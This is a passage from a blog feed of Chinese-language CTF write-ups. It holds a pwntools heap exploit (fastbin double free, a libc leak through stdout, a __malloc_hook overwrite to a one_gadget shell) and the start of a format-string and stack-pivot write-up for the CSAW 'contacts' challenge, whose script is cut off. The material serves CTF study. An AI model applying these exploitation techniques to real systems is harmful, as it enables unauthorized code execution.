operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"[+]> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"[+]> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    sa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Data?\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">quit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"[+]> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"[+]> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"[+]> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 0</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 1</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 2</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'd'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 3</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'e'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 4</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'f'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 5</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\xb0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'd'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'e'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'f'</span><span class=\"token operator\">*</span><span class=\"token number\">0x58</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xe1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">'g'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 10</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'h'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 11</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">'i'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 12</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'j'</span><span class=\"token operator\">*</span><span class=\"token number\">0x38</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'k'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x70'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 13</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'l'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 14</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'm'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 15</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\xbd\\x25'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 15</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>debug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">'win'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x33</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token comment\"># ru('\\x00\\x18\\xad\\xfb')</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>libcbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>og <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xf1919</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>ogg <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> og<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>malloc_hook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>malloc_hook<span class=\"token operator\">-</span><span class=\"token number\">0x23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">'next'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token string\">'next'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>pl <span class=\"token operator\">=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"[+]> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"[+]> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>此题，远程并没有给 libc 文件，知道是 ubuntu 17.04 版本，若打远程需要进行多次尝试，并且脚本在开启 aslr 情况下，需要 1/16 概率</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/29/%E5%A0%86%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E5%88%A9%E7%94%A8/",
            "url": "https://yhuanhuan01.github.io/2024/07/29/%E5%A0%86%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E5%88%A9%E7%94%A8/",
            "title": "堆上格式化字符利用",
            "date_published": "2024-07-29T13:56:59.000Z",
            "content_html": "<h1 id=\"堆上格式化字符利用\"><a class=\"markdownIt-Anchor\" href=\"#堆上格式化字符利用\">#</a> 堆上格式化字符利用</h1>\n<h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<p>在堆上利用格式化字符串，需要注意几个问题</p>\n<p>其实和别的格式化字符串几乎一样，只不过可以多一个利用思路，可以解 system (’/bin/sh’) 写入 chunk 块，篡改 ebp 或 rbp，在有返回地址的情况下 leave ret 之后，进行栈迁移，迁到 system (’/bin/sh’) 那部分地址的 - 4 或 - 8 处</p>\n<p>接下来由一道题目详细介绍这类打法：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3RyZWUvbWFzdGVyL3B3bi9mbXRzdHIvMjAxNS1DU0FXLWNvbnRhY3Rz\">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts</span></p>\n<p>关于程序，需要分析它的贯穿题目利用的结构体</p>\n<pre><code>00000000 Struct_phone struc ; (sizeof=0x50, mappedto_7)\n00000000                               ; XREF: fetsName+1A/r\n00000000                               ; fetsName+34/r ...\n00000000 description dd ?              ; XREF: fetsdescription+41/w\n00000000                               ; fetsdescription+46/r ...\n00000004 phone_number dd ?             ; XREF: fetsPhone+2F/w\n00000004                               ; fetsPhone+35/r ...\n00000008 name db 64 dup(?)             ; XREF: fetsName+1A/r\n00000008                               ; fetsName+34/r ... ; string(C)\n00000048 length dd ?                   ; XREF: fetsdescription+2B/w\n00000048                               ; Display+53/r ...\n0000004C inuse dd ?                    ; XREF: Create+20/r Create+5D/w ...\n00000050 Struct_phone ends\n</code></pre>\n<p>分析过程就不分析了，大概是这样</p>\n<p>整个题目利用处在这里</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">sub_8048BD1</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>format<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\tName: %s\\n\"</span><span class=\"token punctuation\">,</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\tLength %u\\n\"</span><span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\tPhone #: %s\\n\"</span><span class=\"token punctuation\">,</span> a3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\tDescription: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>format<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在这里他是用户打印的内容，其中会格式化解析用户在堆上写入的字符串信息，通过这些信息，我们就很容实现格式化的利用，接下来我们通过劫持 ebp，从而将栈迁移到我们实现布置好的堆块上。</p>\n<p>还是比较简单的，泄露完成信息之后将栈劫持 chunk 即可完成本次攻击</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># context(arch='amd64', os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span> <span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./contacts'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'/home/yhuan/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token 